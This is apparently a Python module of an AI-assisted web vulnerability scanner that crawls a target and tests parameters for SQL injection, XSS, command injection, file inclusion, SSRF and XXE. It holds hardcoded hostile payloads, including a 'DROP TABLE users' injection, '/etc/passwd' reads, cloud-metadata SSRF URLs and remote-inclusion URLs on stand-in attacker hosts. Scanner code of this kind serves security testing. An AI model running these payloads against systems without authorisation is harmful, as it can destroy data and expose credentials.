"""
Enhanced Vulnerability Scanner Module for Atlas AI Security Scanner
Comprehensive vulnerability detection with web crawling and real-time output
"""

import asyncio
import aiohttp
import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse, urlencode
import logging
from datetime import datetime

from core.config import Config
from core.ai_engine import AIEngine
from modules.web_crawler import WebCrawler
from modules.advanced_validator import AdvancedValidator

class VulnerabilityScanner:
    """Advanced vulnerability scanner with AI payload generation"""
    
    def __init__(self, config: Config, logger: logging.Logger, ai_engine: AIEngine):
        self.config = config
        self.logger = logger
        self.ai_engine = ai_engine
        self.target_url = config.target_url
        self.parsed_url = urlparse(config.target_url)
        self.session = None
        
        # Advanced validator for reducing false positives
        self.validator = AdvancedValidator(logger)
        
        # Enhanced vulnerability tracking
        self.vulnerabilities = []
        self.tested_urls = set()
        self.tested_parameters = set()
        self.crawl_data = {}
        
        # Track tested parameter-vulnerability combinations to avoid duplicates
        self.tested_param_vulns = set()
        
        # Real-time output
        self.vuln_count = 0
        self.false_positives_filtered = 0
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.timeout),
            connector=aiohttp.TCPConnector(ssl=False)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def scan_vulnerabilities(self) -> List[Dict[str, Any]]:
        """Enhanced vulnerability scanning with web crawling"""
        self.logger.info("Starting comprehensive vulnerability scanning...")
        print(f"\nVULNERABILITY SCANNING STARTED")
        print(f"{'='*60}")
        
        async with self:
            # Phase 1: Web Crawling
            print(f"Phase 1: Web Crawling & Endpoint Discovery")
            crawler = WebCrawler(self.config, self.logger)
            self.crawl_data = await crawler.crawl_website()
            
            # Phase 2: Target Information Gathering
            print(f"Phase 2: Target Analysis & AI Payload Generation")
            target_info = await self.gather_target_info()
            
            # Phase 3: Comprehensive Vulnerability Testing
            print(f"Phase 3: Vulnerability Testing (Real-time Results)")
            print(f"{'='*60}")
            
            # Test all discovered parameters
            print(f"Testing Parameters for Vulnerabilities...")
            await self.test_all_parameters(target_info)
            
            # Test all discovered forms
            print(f"Testing Forms for Vulnerabilities...")
            await self.test_all_forms(target_info)
            
            # Test all discovered URLs
            print(f"Testing URLs for Vulnerabilities...")
            await self.test_all_urls(target_info)
            
            # Additional specific tests
            await self.test_file_upload()
            await self.test_auth_bypass()
            await self.test_session_management()
            await self.test_information_disclosure()
        
        print(f"\n{'='*60}")
        print(f"VULNERABILITY SCANNING COMPLETED")
        print(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"False Positives Filtered: {self.false_positives_filtered}")
        print(f"Accuracy Rate: {(len(self.vulnerabilities) / max(1, len(self.vulnerabilities) + self.false_positives_filtered) * 100):.1f}%")
        print(f"URLs Tested: {len(self.tested_urls)}")
        print(f"Parameters Tested: {len(self.tested_parameters)}")
        print(f"{'='*60}")
        
        self.logger.info(f"Vulnerability scanning completed. Found {len(self.vulnerabilities)} vulnerabilities, filtered {self.false_positives_filtered} false positives")
        return self.vulnerabilities
    
    async def gather_target_info(self) -> Dict[str, Any]:
        """Gather target information for AI payload generation"""
        target_info = {
            'url': self.target_url,
            'domain': self.parsed_url.netloc,
            'technologies': [],
            'database': 'Unknown',
            'os': 'Unknown',
            'server': 'Unknown',
            'content_type': 'text/html',
            'security_headers': {}
        }
        
        try:
            async with self.session.get(self.target_url) as response:
                headers = response.headers
                body = await response.text()
                
                target_info['server'] = headers.get('Server', 'Unknown')
                target_info['content_type'] = headers.get('Content-Type', 'text/html')
                
                # Extract security headers
                security_headers = [
                    'Content-Security-Policy', 'X-Frame-Options', 'X-XSS-Protection',
                    'X-Content-Type-Options', 'Strict-Transport-Security'
                ]
                for header in security_headers:
                    target_info['security_headers'][header] = headers.get(header)
                
                # Technology detection
                body_lower = body.lower()
                if 'mysql' in body_lower or 'mysql' in headers.get('X-Powered-By', '').lower():
                    target_info['database'] = 'MySQL'
                elif 'postgresql' in body_lower or 'postgres' in body_lower:
                    target_info['database'] = 'PostgreSQL'
                elif 'oracle' in body_lower:
                    target_info['database'] = 'Oracle'
                elif 'mssql' in body_lower or 'sql server' in body_lower:
                    target_info['database'] = 'MSSQL'
                
                # OS detection
                server = headers.get('Server', '').lower()
                if 'win' in server or 'iis' in server:
                    target_info['os'] = 'Windows'
                elif 'unix' in server or 'linux' in server:
                    target_info['os'] = 'Linux'
                
        except Exception as e:
            self.logger.error(f"Failed to gather target info: {e}")
        
        return target_info
    
    async def test_all_parameters(self, target_info: Dict[str, Any]):
        """Test all discovered parameters for vulnerabilities"""
        
        if not self.crawl_data.get('parameters'):
            print("No parameters found to test")
            return
        
        print(f"\nTesting Parameters for Vulnerabilities...")
        total_params = sum(len(params) for params in self.crawl_data['parameters'].values())
        tested_count = 0
        
        for url, params in self.crawl_data['parameters'].items():
            for param_name, param_info in params.items():
                tested_count += 1
                print(f"Testing parameter {tested_count}/{total_params}: {param_name} in {url}")
                
                # Test each parameter for multiple vulnerabilities (avoid duplicates)
                await self.test_parameter_sql_injection(url, param_name, param_info, target_info)
                await self.test_parameter_xss(url, param_name, param_info, target_info)
                await self.test_parameter_command_injection(url, param_name, param_info, target_info)
                await self.test_parameter_lfi_rfi(url, param_name, param_info, target_info)
                await self.test_parameter_ssrf(url, param_name, param_info, target_info)
        
        print(f"Completed testing {tested_count} parameters")
    
    async def test_all_forms(self, target_info: Dict[str, Any]):
        """Test all discovered forms for vulnerabilities"""
        
        if not self.crawl_data.get('forms'):
            print("No forms found to test")
            return
        
        print(f"\nTesting Forms for Vulnerabilities...")
        total_forms = len(self.crawl_data['forms'])
        
        for i, form in enumerate(self.crawl_data['forms'], 1):
            print(f"Testing form {i}/{total_forms}: {form.get('action', 'unknown')}")
            await self.test_form_vulnerabilities(form, target_info)
        
        print(f"Completed testing {total_forms} forms")
    
    async def test_all_urls(self, target_info: Dict[str, Any]):
        """Test all discovered URLs for vulnerabilities"""
        
        if not self.crawl_data.get('urls'):
            return
        
        print(f"\nTesting URLs for Vulnerabilities...")
        
        for url in self.crawl_data['urls']:
            if url not in self.tested_urls:
                self.tested_urls.add(url)
                await self.test_url_vulnerabilities(url, target_info)
    
    async def test_parameter_sql_injection(self, url: str, param_name: str, param_info: Dict, target_info: Dict[str, Any]):
        """Test a specific parameter for SQL injection"""
        
        # Check if already tested this parameter for SQL injection
        test_key = f"{url}#{param_name}#sql_injection"
        if test_key in self.tested_param_vulns:
            return
        self.tested_param_vulns.add(test_key)
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_sql_payloads(target_info)
        
        # Basic SQL injection payloads
        basic_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1' AND 1=1--",
            "' UNION SELECT 1,2,3--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        for payload in all_payloads:
            try:
                method = param_info.get('method', 'GET')
                
                if method == 'GET':
                    test_url = f"{url}?{param_name}={payload}"
                    
                    # Get baseline response first
                    baseline_url = f"{url}?{param_name}=normal_value"
                    baseline_response = ""
                    try:
                        async with self.session.get(baseline_url) as base_resp:
                            baseline_response = await base_resp.text()
                            self.validator.store_baseline(url, baseline_response)
                    except:
                        pass
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        response_text = await response.text()
                        status_code = response.status
                        
                        # Advanced validation with confidence scoring
                        is_valid, confidence, reason = self.validator.validate_sql_injection(
                            response_text, status_code, baseline_response
                        )
                        
                        # Only report if confidence is high enough
                        if is_valid and self.validator.should_report_vulnerability(confidence):
                            vuln = {
                                'type': 'SQL Injection',
                                'severity': 'High' if confidence >= 75 else 'Medium',
                                'confidence': confidence,
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_sql_evidence(response_text),
                                'validation_reason': reason,
                                'description': f'SQL injection vulnerability in parameter "{param_name}"',
                                'impact': 'Database compromise, data theft, authentication bypass',
                                'cwe': 'CWE-89',
                                'owasp': 'A03:2021 - Injection'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output with confidence
                            print(f"[!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: SQL Injection")
                            print(f"   Confidence: {confidence}%")
                            print(f"   URL: {test_url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_sql_evidence(response_text)}")
                            print(f"   Validation: {reason}")
                            print(f"   {'='*50}")
                            
                            break  # Found vulnerability, move to next parameter
                        elif not is_valid or confidence < 50:
                            self.false_positives_filtered += 1
                
                elif method == 'POST':
                    # Test POST parameters
                    data = {param_name: payload}
                    
                    start_time = time.time()
                    async with self.session.post(url, data=data) as response:
                        response_time = time.time() - start_time
                        response_text = await response.text()
                        
                        if await self.check_sql_injection_response(response_text, response_time, payload):
                            vuln = {
                                'type': 'SQL Injection (POST)',
                                'severity': 'High',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': self.get_sql_evidence(response_text),
                                'description': f'SQL injection vulnerability in POST parameter "{param_name}"',
                                'impact': 'Database compromise, data theft, authentication bypass',
                                'cwe': 'CWE-89',
                                'owasp': 'A03:2021 - Injection'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output
                            print(f"VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: SQL Injection (POST)")
                            print(f"   URL: {url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: {self.get_sql_evidence(response_text)}")
                            print(f"   {'='*50}")
                            
                            break
            
            except Exception as e:
                continue
    
    async def check_sql_injection_response(self, response_text: str, response_time: float, payload: str) -> bool:
        """Check if response indicates SQL injection"""
        
        # More specific SQL error patterns to reduce false positives
        sql_errors = [
            'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
            'ORA-01756', 'ORA-00933', 'ORA-00921',
            'Microsoft OLE DB Provider for ODBC Drivers',
            'ODBC SQL Server Driver',
            'SQLServer JDBC Driver',
            'PostgreSQL query failed',
            'Warning: pg_query',
            'SQLite/JDBCDriver',
            'SQLiteException',
            'SQLSTATE[HY000]',
            'SQL syntax.*MySQL',
            'mysql_query(): supplied argument',
            'ORA-00936: missing expression'
        ]
        
        # Check for specific SQL errors (more precise matching)
        for error in sql_errors:
            if error in response_text:
                return True
        
        # Check for time-based SQL injection (more strict)
        if ('sleep' in payload.lower() or 'waitfor' in payload.lower()) and response_time > 5:
            return True
        
        # Check for UNION-based injection indicators
        if 'union' in payload.lower() and ('null' in response_text.lower() or 'column' in response_text.lower()):
            return True
        
        return False
    
    def get_sql_evidence(self, response_text: str) -> str:
        """Extract SQL error evidence from response"""
        
        sql_errors = [
            'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
            'ORA-01756', 'ORA-00933', 'ORA-00921',
            'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
            'SQLServer JDBC Driver', 'PostgreSQL query failed',
            'Warning: pg_', 'SQLite.Exception',
            'syntax error', 'SQLSTATE', 'SQLException'
        ]
        
        for error in sql_errors:
            if error.lower() in response_text.lower():
                return error
        
        return "SQL injection detected"
    
    async def test_parameter_xss(self, url: str, param_name: str, param_info: Dict, target_info: Dict[str, Any]):
        """Test a specific parameter for XSS"""
        
        # Check if already tested this parameter for XSS
        test_key = f"{url}#{param_name}#xss"
        if test_key in self.tested_param_vulns:
            return
        self.tested_param_vulns.add(test_key)
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_xss_payloads(target_info)
        
        # Basic XSS payloads with unique identifiers
        unique_id = f"XSS{hash(f'{url}{param_name}') % 10000}"
        basic_payloads = [
            f"<script>alert('{unique_id}')</script>",
            f"<img src=x onerror=alert('{unique_id}')>",
            f"<svg onload=alert('{unique_id}')>",
            f"javascript:alert('{unique_id}')",
            f"';alert('{unique_id}');//",
            f"\"onmouseover=\"alert('{unique_id}')\"",
            f"<iframe src=javascript:alert('{unique_id}')></iframe>"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        for payload in all_payloads:
            try:
                method = param_info.get('method', 'GET')
                
                if method == 'GET':
                    # Get baseline response
                    baseline_url = f"{url}?{param_name}=normal_value"
                    baseline_response = ""
                    try:
                        async with self.session.get(baseline_url) as base_resp:
                            baseline_response = await base_resp.text()
                    except:
                        pass
                    
                    test_url = f"{url}?{param_name}={payload}"
                    
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        status_code = response.status
                        
                        # Advanced XSS validation
                        is_valid, confidence, reason = self.validator.validate_xss(
                            payload, response_text, status_code, baseline_response
                        )
                        
                        # Only report if confidence is high enough
                        if is_valid and self.validator.should_report_vulnerability(confidence):
                            vuln = {
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'High' if confidence >= 75 else 'Medium',
                                'confidence': confidence,
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': 'Payload reflected in executable context',
                                'validation_reason': reason,
                                'description': f'XSS vulnerability in parameter "{param_name}"',
                                'impact': 'Session hijacking, credential theft, malicious redirects',
                                'cwe': 'CWE-79',
                                'owasp': 'A03:2021 - Injection'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output with confidence
                            print(f"[!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Cross-Site Scripting (XSS)")
                            print(f"   Confidence: {confidence}%")
                            print(f"   URL: {test_url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Validation: {reason}")
                            print(f"   {'='*50}")
                            
                            break
                        elif not is_valid or confidence < 50:
                            self.false_positives_filtered += 1
                
                elif method == 'POST':
                    data = {param_name: payload}
                    
                    async with self.session.post(url, data=data) as response:
                        response_text = await response.text()
                        
                        if self.is_xss_vulnerable(payload, response_text):
                            vuln = {
                                'type': 'Cross-Site Scripting (XSS) - POST',
                                'severity': 'Medium',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': method,
                                'evidence': 'Payload reflected in response',
                                'description': f'XSS vulnerability in POST parameter "{param_name}"',
                                'impact': 'Session hijacking, credential theft, malicious redirects',
                                'cwe': 'CWE-79',
                                'owasp': 'A03:2021 - Injection'
                            }
                            
                            self.vulnerabilities.append(vuln)
                            self.vuln_count += 1
                            
                            # Real-time output (ASCII only)
                            print(f"[!] VULNERABILITY FOUND #{self.vuln_count}")
                            print(f"   Type: Cross-Site Scripting (XSS) - POST")
                            print(f"   URL: {url}")
                            print(f"   Parameter: {param_name}")
                            print(f"   Payload: {payload}")
                            print(f"   Evidence: Payload reflected in response")
                            print(f"   {'='*50}")
                            
                            break
            
            except Exception as e:
                continue
    
    async def test_sql_injection(self, target_info: Dict[str, Any]):
        """Test for SQL injection vulnerabilities"""
        self.logger.info("Testing for SQL injection...")
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_sql_payloads(target_info)
        
        # Basic payloads
        basic_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--",
            "' OR 'x'='x",
            "1' AND 1=1--",
            "' UNION SELECT 1,2,3--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' WAITFOR DELAY '00:00:05'--"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        # Test parameters
        test_params = ['id', 'user', 'search', 'q', 'name', 'email', 'username', 'password']
        
        for param in test_params:
            for payload in all_payloads:
                await self.test_sql_payload(param, payload, target_info)
    
    async def test_sql_payload(self, param: str, payload: str, target_info: Dict[str, Any]):
        """Test a single SQL injection payload"""
        try:
            # URL-based testing
            test_url = f"{self.target_url}?{param}={payload}"
            
            start_time = time.time()
            async with self.session.get(test_url) as response:
                response_time = time.time() - start_time
                response_text = await response.text()
                
                # Check for SQL errors
                sql_errors = [
                    'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                    'ORA-01756', 'ORA-00933', 'ORA-00921',
                    'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
                    'SQLServer JDBC Driver', 'PostgreSQL query failed',
                    'Warning: pg_', 'valid PostgreSQL result',
                    'SQLite/JDBCDriver', 'SQLite.Exception',
                    'System.Data.SQLite.SQLiteException',
                    'syntax error', 'mysql_connect', 'ORA-', 'Microsoft JET Database'
                ]
                
                for error in sql_errors:
                    if error.lower() in response_text.lower():
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'evidence': error,
                            'url': test_url,
                            'method': 'GET',
                            'description': f'SQL error detected in parameter "{param}"',
                            'impact': 'Database compromise, data theft, authentication bypass',
                            'cwe': 'CWE-89',
                            'owasp': 'A03:2021 - Injection'
                        })
                        return
                
                # Check for time-based SQL injection
                if response_time > 5:
                    self.vulnerabilities.append({
                        'type': 'Time-based SQL Injection',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Response delay: {response_time:.2f}s',
                        'url': test_url,
                        'method': 'GET',
                        'description': 'Potential time-based SQL injection detected',
                        'impact': 'Database enumeration, data extraction',
                        'cwe': 'CWE-89',
                        'owasp': 'A03:2021 - Injection'
                    })
                    return
                
                # Check for boolean-based SQL injection
                if len(response_text) != len(await self.get_baseline_response(param)):
                    # Additional verification needed
                    true_payload = f"{param}=1' AND '1'='1"
                    false_payload = f"{param}=1' AND '1'='2"
                    
                    true_response = await self.session.get(f"{self.target_url}?{true_payload}")
                    false_response = await self.session.get(f"{self.target_url}?{false_payload}")
                    
                    true_text = await true_response.text()
                    false_text = await false_response.text()
                    
                    if len(true_text) != len(false_text):
                        self.vulnerabilities.append({
                            'type': 'Boolean-based SQL Injection',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Different response lengths for true/false conditions',
                            'url': test_url,
                            'method': 'GET',
                            'description': 'Boolean-based blind SQL injection detected',
                            'impact': 'Database enumeration through boolean queries',
                            'cwe': 'CWE-89',
                            'owasp': 'A03:2021 - Injection'
                        })
        
        except Exception as e:
            pass  # Continue testing other payloads
    
    async def get_baseline_response(self, param: str) -> str:
        """Get baseline response for comparison"""
        try:
            baseline_url = f"{self.target_url}?{param}=1"
            async with self.session.get(baseline_url) as response:
                return await response.text()
        except:
            return ""
    
    async def test_xss(self, target_info: Dict[str, Any]):
        """Test for XSS vulnerabilities"""
        self.logger.info("Testing for XSS...")
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_xss_payloads(target_info)
        
        # Basic XSS payloads
        basic_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "\"onmouseover=\"alert('XSS')\"",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        # Test parameters
        test_params = ['search', 'q', 'name', 'comment', 'message', 'input', 'query', 'term']
        
        for param in test_params:
            for payload in all_payloads:
                await self.test_xss_payload(param, payload)
    
    async def test_xss_payload(self, param: str, payload: str):
        """Test a single XSS payload"""
        try:
            test_url = f"{self.target_url}?{param}={payload}"
            
            async with self.session.get(test_url) as response:
                response_text = await response.text()
                
                # Check if payload is reflected
                if payload in response_text:
                    # Check if it's in a dangerous context
                    dangerous_contexts = [
                        f'<script>{payload}</script>',
                        f'javascript:{payload}',
                        f'onerror={payload}',
                        f'onload={payload}',
                        f'onfocus={payload}'
                    ]
                    
                    is_dangerous = any(context in response_text for context in dangerous_contexts)
                    
                    self.vulnerabilities.append({
                        'type': 'Reflected Cross-Site Scripting (XSS)',
                        'severity': 'High' if is_dangerous else 'Medium',
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Payload reflected in response',
                        'url': test_url,
                        'method': 'GET',
                        'description': f'XSS vulnerability in parameter "{param}"',
                        'impact': 'Session hijacking, credential theft, malicious redirects',
                        'cwe': 'CWE-79',
                        'owasp': 'A03:2021 - Injection'
                    })
        
        except Exception as e:
            pass
    
    async def test_command_injection(self, target_info: Dict[str, Any]):
        """Test for command injection vulnerabilities"""
        self.logger.info("Testing for command injection...")
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_command_injection_payloads(target_info)
        
        # Basic command injection payloads
        basic_payloads = [
            "; ls -la",
            "| whoami",
            "&& dir",
            "; cat /etc/passwd",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; sleep 5",
            "& ping -c 4 127.0.0.1",
            "; id",
            "| net user",
            "&& echo vulnerable"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        # Test parameters
        test_params = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip', 'file']
        
        for param in test_params:
            for payload in all_payloads:
                await self.test_command_payload(param, payload)
    
    async def test_command_payload(self, param: str, payload: str):
        """Test a single command injection payload"""
        try:
            test_url = f"{self.target_url}?{param}={payload}"
            
            start_time = time.time()
            async with self.session.get(test_url) as response:
                response_time = time.time() - start_time
                response_text = await response.text()
                
                # Check for command execution indicators
                command_indicators = [
                    'root:', 'daemon:', 'bin:', 'sys:', 'adm:',  # /etc/passwd
                    'Windows', 'System32', 'drivers',  # Windows paths
                    'uid=', 'gid=', 'groups=',  # id command output
                    'PING', 'packets transmitted',  # ping output
                    'Directory of', 'Volume Serial Number'  # dir output
                ]
                
                for indicator in command_indicators:
                    if indicator in response_text:
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Command execution detected: {indicator}',
                            'url': test_url,
                            'method': 'GET',
                            'description': f'Command injection in parameter "{param}"',
                            'impact': 'Remote code execution, system compromise',
                            'cwe': 'CWE-78',
                            'owasp': 'A03:2021 - Injection'
                        })
                        return
                
                # Check for time-based command injection
                if 'sleep' in payload and response_time > 4:
                    self.vulnerabilities.append({
                        'type': 'Time-based Command Injection',
                        'severity': 'High',
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Response delay: {response_time:.2f}s',
                        'url': test_url,
                        'method': 'GET',
                        'description': 'Time-based command injection detected',
                        'impact': 'Remote code execution through time delays',
                        'cwe': 'CWE-78',
                        'owasp': 'A03:2021 - Injection'
                    })
        
        except Exception as e:
            pass
    
    async def test_file_inclusion(self):
        """Test for file inclusion vulnerabilities"""
        self.logger.info("Testing for file inclusion...")
        
        # LFI payloads
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "/etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=index.php"
        ]
        
        # RFI payloads
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/backdoor.php"
        ]
        
        test_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'template']
        
        for param in test_params:
            # Test LFI
            for payload in lfi_payloads:
                await self.test_lfi_payload(param, payload)
            
            # Test RFI
            for payload in rfi_payloads:
                await self.test_rfi_payload(param, payload)
    
    async def test_lfi_payload(self, param: str, payload: str):
        """Test Local File Inclusion payload"""
        try:
            test_url = f"{self.target_url}?{param}={payload}"
            
            async with self.session.get(test_url) as response:
                response_text = await response.text()
                
                # Check for file inclusion indicators
                lfi_indicators = [
                    'root:', 'daemon:', 'bin:',  # /etc/passwd
                    '[drivers]', '[fonts]',  # Windows hosts file
                    '<?php', '<?=',  # PHP source code
                    'PK',  # ZIP file header (base64 encoded files)
                ]
                
                for indicator in lfi_indicators:
                    if indicator in response_text:
                        self.vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'File content detected: {indicator}',
                            'url': test_url,
                            'method': 'GET',
                            'description': f'LFI vulnerability in parameter "{param}"',
                            'impact': 'Unauthorized file access, information disclosure',
                            'cwe': 'CWE-22',
                            'owasp': 'A01:2021 - Broken Access Control'
                        })
                        return
        
        except Exception as e:
            pass
    
    async def test_rfi_payload(self, param: str, payload: str):
        """Test Remote File Inclusion payload"""
        try:
            test_url = f"{self.target_url}?{param}={payload}"
            
            async with self.session.get(test_url) as response:
                response_text = await response.text()
                
                # This would require setting up a remote server to test properly
                # For now, we'll check for error messages that might indicate RFI attempts
                rfi_errors = [
                    'failed to open stream',
                    'No such file or directory',
                    'HTTP request failed',
                    'allow_url_include'
                ]
                
                for error in rfi_errors:
                    if error in response_text:
                        self.vulnerabilities.append({
                            'type': 'Potential Remote File Inclusion (RFI)',
                            'severity': 'Medium',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'RFI attempt detected: {error}',
                            'url': test_url,
                            'method': 'GET',
                            'description': f'Potential RFI vulnerability in parameter "{param}"',
                            'impact': 'Remote code execution, system compromise',
                            'cwe': 'CWE-98',
                            'owasp': 'A03:2021 - Injection'
                        })
                        return
        
        except Exception as e:
            pass
    
    async def test_ssrf(self, target_info: Dict[str, Any]):
        """Test for SSRF vulnerabilities"""
        self.logger.info("Testing for SSRF...")
        
        # Generate AI payloads
        ai_payloads = await self.ai_engine.generate_ssrf_payloads(target_info)
        
        # Basic SSRF payloads
        basic_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "http://169.254.169.254/metadata/instance",  # Azure metadata
            "file:///etc/passwd",
            "gopher://127.0.0.1:25/",
            "dict://127.0.0.1:11211/",
            "http://0.0.0.0:80",
            "http://[::1]:80"
        ]
        
        all_payloads = basic_payloads + ai_payloads
        
        test_params = ['url', 'uri', 'link', 'src', 'source', 'target', 'redirect', 'proxy']
        
        for param in test_params:
            for payload in all_payloads:
                await self.test_ssrf_payload(param, payload)
    
    async def test_ssrf_payload(self, param: str, payload: str):
        """Test a single SSRF payload"""
        try:
            test_url = f"{self.target_url}?{param}={payload}"
            
            async with self.session.get(test_url) as response:
                response_text = await response.text()
                
                # Check for SSRF indicators
                ssrf_indicators = [
                    'ami-id', 'instance-id',  # AWS metadata
                    'computeMetadata',  # GCP metadata
                    'Microsoft Azure',  # Azure metadata
                    'SSH-2.0',  # SSH banner
                    'root:', 'daemon:',  # /etc/passwd via file://
                    'Connection refused',
                    'Connection timeout'
                ]
                
                for indicator in ssrf_indicators:
                    if indicator in response_text:
                        self.vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'SSRF detected: {indicator}',
                            'url': test_url,
                            'method': 'GET',
                            'description': f'SSRF vulnerability in parameter "{param}"',
                            'impact': 'Internal network access, cloud metadata exposure',
                            'cwe': 'CWE-918',
                            'owasp': 'A10:2021 - Server-Side Request Forgery'
                        })
                        return
        
        except Exception as e:
            pass
    
    async def test_xxe(self):
        """Test for XXE vulnerabilities"""
        self.logger.info("Testing for XXE...")
        
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>'''
        ]
        
        # Test POST requests with XML data
        for payload in xxe_payloads:
            await self.test_xxe_payload(payload)
    
    async def test_xxe_payload(self, payload: str):
        """Test a single XXE payload"""
        try:
            headers = {'Content-Type': 'application/xml'}
            
            async with self.session.post(self.target_url, data=payload, headers=headers) as response:
                response_text = await response.text()
                
                # Check for XXE indicators
                xxe_indicators = [
                    'root:', 'daemon:', 'bin:',  # /etc/passwd
                    'ami-id', 'instance-id',  # AWS metadata
                    'XML parsing error',
                    'External entity'
                ]
                
                for indicator in xxe_indicators:
                    if indicator in response_text:
                        self.vulnerabilities.append({
                            'type': 'XML External Entity (XXE)',
                            'severity': 'High',
                            'payload': payload,
                            'evidence': f'XXE detected: {indicator}',
                            'url': self.target_url,
                            'method': 'POST',
                            'description': 'XXE vulnerability in XML processing',
                            'impact': 'File disclosure, SSRF, denial of service',
                            'cwe': 'CWE-611',
                            'owasp': 'A05:2021 - Security Misconfiguration'
                        })
                        return
        
        except Exception as e:
            pass
    
    async def test_file_upload(self):
        """Test for file upload vulnerabilities"""
        self.logger.info("Testing for file upload vulnerabilities...")
        
        # This would require finding upload forms and testing them
        # For now, we'll implement a basic check
        try:
            async with self.session.get(self.target_url) as response:
                response_text = await response.text()
                
                # Look for file upload forms
                if 'type="file"' in response_text.lower():
                    self.vulnerabilities.append({
                        'type': 'File Upload Form Detected',
                        'severity': 'Info',
                        'evidence': 'File upload form found',
                        'url': self.target_url,
                        'method': 'GET',
                        'description': 'File upload functionality detected - manual testing recommended',
